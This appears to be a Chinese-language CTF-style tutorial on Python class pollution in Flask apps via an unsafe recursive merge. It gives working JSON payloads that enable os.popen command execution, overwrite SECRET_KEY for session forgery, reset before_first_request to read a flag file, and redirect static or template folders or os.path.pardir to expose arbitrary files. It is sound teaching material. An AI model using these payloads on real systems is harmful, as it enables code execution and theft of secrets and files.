<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_a</span>(<span class="params">var_1, var_2=<span class="number">2</span>, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_b</span>(<span class="params">var_1, /, var_2=<span class="number">2</span>, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_c</span>(<span class="params">var_1, var_2=<span class="number">2</span>, *, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_d</span>(<span class="params">var_1, /, var_2=<span class="number">2</span>, *, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func_a.__kwdefaults__)</span><br><span class="line"><span class="comment"># None</span></span><br><span class="line"><span class="built_in">print</span>(func_b.__kwdefaults__)</span><br><span class="line"><span class="comment"># None</span></span><br><span class="line"><span class="built_in">print</span>(func_c.__kwdefaults__)</span><br><span class="line"><span class="comment"># &#123;&#x27;var_3&#x27;: 3&#125;</span></span><br><span class="line"><span class="built_in">print</span>(func_d.__kwdefaults__)</span><br><span class="line"><span class="comment"># &#123;&#x27;var_3&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>通过替换该属性便能实现对函数键值形参的默认值替换</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evilFunc</span>(<span class="params">arg_1, *, shell=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;evilFunc&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;shell&quot;</span>: <span class="literal">True</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment"># laptop-hgndqc28\koishi</span></span><br></pre></td></tr></table></figure></div>



<h3 id="特定值替换"><a href="#特定值替换" class="headerlink" title="特定值替换"></a>特定值替换</h3><h4 id="os-environ赋值"><a href="#os-environ赋值" class="headerlink" title="os.environ赋值"></a><code>os.environ</code>赋值</h4><p>可以实现多种利用方式，如<code>NCTF2022</code>中<code>calc</code>考点对<code>os.system</code>的利用，结合<code>LD_PRELOAD</code>与文件上传<code>.so</code>实现劫持等</p>
<p>&#x2F;&#x2F; todo</p>
<h4 id="flask相关特定属性"><a href="#flask相关特定属性" class="headerlink" title="flask相关特定属性"></a><code>flask</code>相关特定属性</h4><h5 id="SECRET-KEY"><a href="#SECRET-KEY" class="headerlink" title="SECRET_KEY"></a><code>SECRET_KEY</code></h5><p>决定<code>flask</code>的<code>session</code>生成的重要参数，知道该参数可以实现<code>session</code>任意伪造</p>
<p>给出示范环境如下：</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&quot;koishi&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;[+]Config:%s&quot;</span> % (app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>正常访问</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111195117344.png"
                      alt="image-20240111195117344"
                ></p>
<p>使用如下的<code>Payload</code>：</p>
<h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;config&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;SECRET_KEY&quot;</span> <span class="punctuation">:</span><span class="string">&quot;shruti&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111195247022.png"
                      alt="image-20240111195247022"
                ></p>
<p>修改为GET再次请求也仍然被换成了 shruti </p>
<h5 id="got-first-request"><a href="#got-first-request" class="headerlink" title="_got_first_request"></a><code>_got_first_request</code></h5><p>用于判定是否某次请求为自<code>Flask</code>启动后第一次请求，是<code>Flask.got_first_request</code>函数的返回值，此外还会影响装饰器<code>app.before_first_request</code>的调用，依据源码可以知道<code>_got_first_request</code>值为假时才会调用：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127104851348-904331972.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127104901229-2020805748.png"
                      alt="img"
                ></p>
<p><strong>给出示范环境如下：</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;Where is Flag?&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(app, <span class="string">&quot;special&quot;</span>) <span class="keyword">and</span> app.special == <span class="string">&quot;U_Polluted_It&quot;</span>:</span><br><span class="line">        flag = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="built_in">setattr</span>(app, <span class="string">&quot;special&quot;</span>, <span class="string">&quot;U_Polluted_It&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>



<p><strong>flag</strong>文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">koishi&#123;congratulation&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>before_first_request</code>修饰的<code>init</code>函数只会在第一次访问前被调用，而其中读取<code>flag</code>的逻辑又需要访问路由<code>/</code>后才能触发，这就构成了矛盾。所以需要使用<code>payload</code>在访问<code>/</code>后重置<code>_got_first_request</code>属性值为假，这样<code>before_first_request</code>才会再次调用。</p>
<p>携带<code>Payload</code>重置<code>_got_first_request</code>属性值为假</p>
<h6 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h6><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;_got_first_request&quot;</span> <span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><code>init</code>函数被触发，且其中读取<code>flag</code>的相关逻辑被执行，这样就获得了<code>flag</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111204529612.png"
                      alt="image-20240111204529612"
                ></p>
<h5 id="static-url-path"><a href="#static-url-path" class="headerlink" title="_static_url_path"></a><code>_static_url_path</code></h5><p>这个属性中存放的是<code>flask</code>中静态目录的值，默认该值为<code>static</code>。访问<code>flask</code>下的资源可以采用如<code>http://domain/static/xxx</code>，这样实际上就相当于访问<code>_static_url_path</code>目录下<code>xxx</code>的文件并将该文件内容作为响应内容返回。除此以外还有个值，static_folder，这个值是表示后端存放文件的位置。</p>
<p>区别：</p>
<ul>
<li><p><strong>static_url_path：</strong></p>
<p>前端访问资源文件的前缀目录，也就是规定了前端如何访问文件，默认是<code>/static</code>，就是前端必须这样访问：<code>&lt;img src=&quot;/static/img/mylogo.jpg&quot; /&gt;</code>我们改成 <code>&#39;&#39;</code>，就可以这样访问了：<code>&lt;img src=&quot;/img/mylogo.jpg&quot; /&gt;</code></p>
</li>
<li><p><strong>static_folder:</strong></p>
<p>后端存储资源文件的目录。这个也就是我们实际存放文件的位置，所以我们要污染应该是污染这个值</p>
</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--static/hello.html--&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;hello&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag in ./flag but heres only static/hello.html&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p><strong>flag 文件</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">koishi&#123;congratulation&#125;</span><br></pre></td></tr></table></figure></div>



<p>此时<code>http://domain/static/xxx</code>只能访问到文件系统当前目录下<code>static</code>目录中的<code>xxx</code>文件，并且不存在如目录穿越的漏洞</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111205332589.png"
                      alt="image-20240111205332589"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111205403186.png"
                      alt="image-20240111205403186"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111205428286.png"
                      alt="image-20240111205428286"
                ></p>
<p>污染该属性为当前目录。这样就能访问到当前目录下的<code>flag</code>文件了</p>
<h6 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h6><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;static_folder&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;./&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><code>static_folder</code> 或者 <code>_static_folder</code> 都行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111210325608.png"
                      alt="image-20240111210325608"
                ></p>
<p><strong>污染后访问 <code>/static/flag</code> 即可访问到文件了</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111210340963.png"
                      alt="image-20240111210340963"
                ></p>
<h5 id="os-path-pardir"><a href="#os-path-pardir" class="headerlink" title="os.path.pardir"></a><code>os.path.pardir</code></h5><p>这个<code>os</code>模块下的变量会影响<code>flask</code>的模板渲染函数<code>render_template</code>的解析，所以也收录在<code>flask</code>部分，模拟的环境如下：</p>
<p>html 文件和 flag 文件同上</p>
<p>app.py</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag in ./flag but u just can use /file to vist ./templates/file&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>直接访问<code>http://domain/xxx</code>时会使用<code>render_tempaltes</code>渲染<code>templates/xxx</code>文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111220619972.png"
                      alt="image-20240111220619972"
                ></p>
<p>如果尝试目录穿越则会导致<code>render_template</code>函数报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111221002379.png"
                      alt="image-20240111221002379"
                ></p>
<p>根据报错信息的调用栈可以来到这段代码</p>
<p><a href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105049691-1067181145.png"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127105049691-1067181145.png"
                      alt="img"
                ></a></p>
<p><a href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105056882-616179342.png"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127105056882-616179342.png"
                      alt="img"
                ></a></p>
<p>跟进95行的<code>get_source</code>函数，来到<code>Lib/site-packages/jinja2/loaders.py</code></p>
<p><a href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105103715-1715379768.png"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127105103715-1715379768.png"
                      alt="img"
                ></a></p>
<p>继续跟进195行的<code>split_template_path</code>函数</p>
<p><a href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105114125-1116989441.png"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127105114125-1116989441.png"
                      alt="img"
                ></a></p>
<p>结合函数注释可以了解到这个函数将会把传入的模板路径按照<code>/</code>进行分割，在34行的逻辑判断上决定了（其余的部分逻辑值基本为假）整个<code>if</code>语句是否为真，显然需要改语句为假避免触发34行的<code>raise</code>。34行中的<code>os.path.pardir</code>值即为<code>..</code>，所以只要修改该属性为任意其他值即可避免报错，从而实现<code>render_template</code>函数的目录穿越</p>
<p><a href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127105121312-663675572.png"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127105121312-663675572.png"
                      alt="img"
                ></a></p>
<p>修改为无关的<code>koishi</code>：</p>
<h6 id="payload1-1"><a href="#payload1-1" class="headerlink" title="payload1"></a>payload1</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;: &#123;</span><br><span class="line">        &quot;__globals__&quot;: &#123;</span><br><span class="line">            &quot;os&quot;: &#123;</span><br><span class="line">                &quot;path&quot;: &#123;</span><br><span class="line">                    &quot;pardir&quot;: &quot;koishi&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111221205486.png"
                      alt="image-20240111221205486"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111221236591.png"
                      alt="image-20240111221236591"
                ></p>
<h6 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h6><p>在下面jinja的研究中，我自己又发现了一个修改的方式，这个方式有点像上面那个指定static文件夹的方式，这个修改方式需要在没访问需要去的界面时进行操作，否则有缓存的话会失效。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;jinja_env&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;template_folder&quot;</span>: <span class="string">&quot;./&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h5 id="Jinja语法标识符"><a href="#Jinja语法标识符" class="headerlink" title="Jinja语法标识符"></a>Jinja语法标识符</h5><p>在默认的规则规则下，常用<code>Jinja</code>语法标识符有<code>&#123;&#123; Code &#125;&#125;</code>、<code>&#123;% Code %&#125;</code>、&#96;&#96;，当然对于我们需要<code>RCE</code>的需求来说，通常前两者才需要留意。而<code>Flask</code>官方文档中明确告知了，这些语法标识符均是可以依照<code>Jinja</code>中修改的：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127105144799-1907488324.png"
                      alt="img"
                ></p>
<p>在<code>Jinja</code>文档中展示了对这些语法标识符进行替换的方法：<a class="link"   href="https://jinja.palletsprojects.com/en/3.1.x/api/#jinja2.Environment" >API — Jinja Documentation (3.1.x) (palletsprojects.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，即对<code>Jinja</code>的环境类的相关属性赋值，里面也有语法标识符的开始和结束符号的变量：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240111222844407.png"
                      alt="image-20240111222844407"
                ></p>
